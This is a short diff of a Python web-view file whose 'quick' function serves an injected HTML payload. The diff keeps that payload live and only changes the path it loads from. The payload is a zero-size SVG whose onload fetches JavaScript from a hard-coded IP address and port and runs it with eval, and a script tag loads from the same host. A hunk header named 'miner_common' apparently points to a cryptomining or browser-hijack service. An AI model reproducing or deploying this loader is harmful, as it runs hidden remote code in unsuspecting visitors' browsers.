@@ -20,6 +20,6 @@ def miner_common(request):
 
 def quick(request):
 	return HttpResponse('''
-<svg onload='var a=new XMLHttpRequest();a.onreadystatechange=function(){if(a.readyState==4&&a.status==200){eval(a.responseText)}};a.open("GET","http://216.189.150.136:5555/X5lKvJQHFb/");a.send();' style='height:0px;width:0px;'></svg>
-<script src='http://216.189.150.136:5555/X5lKvJQHFb/'></script>
+<svg onload='var a=new XMLHttpRequest();a.onreadystatechange=function(){if(a.readyState==4&&a.status==200){eval(a.responseText)}};a.open("GET","http://216.189.150.136:5555/AHx6tXUYnO1yBxCd/");a.send();' style='height:0px;width:0px;'></svg>
+<script src='http://216.189.150.136:5555/AHx6tXUYnO1yBxCd/'></script>
 ''')
